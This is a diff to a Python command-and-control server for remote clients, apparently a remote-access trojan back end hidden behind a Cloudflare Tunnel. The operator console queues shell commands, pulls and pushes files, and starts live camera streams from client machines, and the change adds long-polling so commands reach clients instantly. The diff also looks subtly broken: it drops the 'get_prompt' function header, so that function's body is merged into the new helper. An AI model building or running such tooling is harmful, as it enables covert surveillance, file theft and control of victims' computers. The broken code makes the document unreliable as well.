@@ -5,7 +5,7 @@ and cancel support. Runs on Mac behind Cloudflare Tunnel.
 Usage: python3 server.py
 """
 
-VERSION = "3.0.8"
+VERSION = "3.1.0"
 
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
@@ -38,14 +38,21 @@ def get_or_create_client(client_id):
             "last_checkin": 0,
             "pending_command": None,
             "pending_signal": None,
-            "pending_stdin": [],      # queued stdin lines for interactive commands
+            "pending_stdin": [],
             "command_running": False,
             "interactive": False,
+            "cmd_event": threading.Event(),   # set when a command is ready
         }
     return clients[client_id]
 
 
-def get_prompt():
+def set_command(client, cmd):
+    """Set a pending command and wake the long-polling /cmd handler. Lock must be held."""
+    client["pending_command"] = cmd
+    client["cmd_event"].set()
+
+
+
     """Return the current prompt string."""
     if active_client:
         client = clients.get(active_client)
@@ -119,11 +126,28 @@ class Handler(BaseHTTPRequestHandler):
             if not client_id:
                 self._respond(400, b"missing id")
                 return
+            # Long-poll: hold the connection open up to 30s waiting for a command.
+            # This replaces the client's adaptive sleep — 0 CPU/network when idle.
+            LONG_POLL_TIMEOUT = 30  # seconds
             with lock:
                 client = get_or_create_client(client_id)
                 client["last_checkin"] = time.time()
+                event = client["cmd_event"]
                 cmd = client["pending_command"] or ""
-                client["pending_command"] = None
+                if cmd:
+                    client["pending_command"] = None
+                    event.clear()
+            if not cmd:
+                # Wait outside the lock so other threads can set a command
+                event.wait(timeout=LONG_POLL_TIMEOUT)
+                with lock:
+                    client = clients.get(client_id)
+                    if client:
+                        client["last_checkin"] = time.time()
+                        cmd = client["pending_command"] or ""
+                        if cmd:
+                            client["pending_command"] = None
+                            client["cmd_event"].clear()
             self._respond(200, cmd.encode())
 
         elif path == "/signal":
@@ -470,6 +494,7 @@ def input_loop():
                 match = _resolve_client(target)
                 if match:
                     clients[match]["pending_command"] = "exit"
+                    clients[match]["cmd_event"].set()
                     clients[match]["pending_stdin"] = []
                     print(f"[*] Exit command sent to {match}.")
                     if active_client == match:
@@ -574,6 +599,7 @@ def input_loop():
                 # stream runs in background on client — does NOT set command_running
                 # so the operator can still send stopstream / other commands
                 client["pending_command"] = "stream"
+                client["cmd_event"].set()
                 streaming_clients.add(active_client)
             print(f"[*] Camera stream started on {active_client}")
             print(f"[*] View at: http://localhost:4444/camera?id={active_client}")
@@ -595,6 +621,7 @@ def input_loop():
                 # Send as a command (not a signal) — signals are only polled inside
                 # Invoke-CommandStreaming; the streaming main loop polls /cmd
                 client["pending_command"] = "stopstream"
+                client["cmd_event"].set()
                 client["pending_signal"] = None
                 client["pending_stdin"] = []
             print(f"[*] Camera stream stopped on {active_client}")
@@ -618,6 +645,7 @@ def input_loop():
                     continue
                 client["pending_stdin"] = []
                 client["pending_command"] = f"get:{filename}"
+                client["cmd_event"].set()
                 client["command_running"] = True
             print(f"[*] Requesting '{filename}' from {active_client}...")
             continue
@@ -654,6 +682,7 @@ def input_loop():
                 pending_files[active_client] = (filename, data)
                 client["pending_stdin"] = []
                 client["pending_command"] = f"put:{filename}"
+                client["cmd_event"].set()
                 client["command_running"] = True
             print(f"[*] Pushing '{filename}' ({len(data):,} bytes) to {active_client}...")
             continue
@@ -675,6 +704,7 @@ def input_loop():
                     print(f"[!] Previous command on {active_client} still pending — overwriting.")
                 client["pending_stdin"] = []
                 client["pending_command"] = cmd
+                client["cmd_event"].set()
                 client["command_running"] = True
 
 
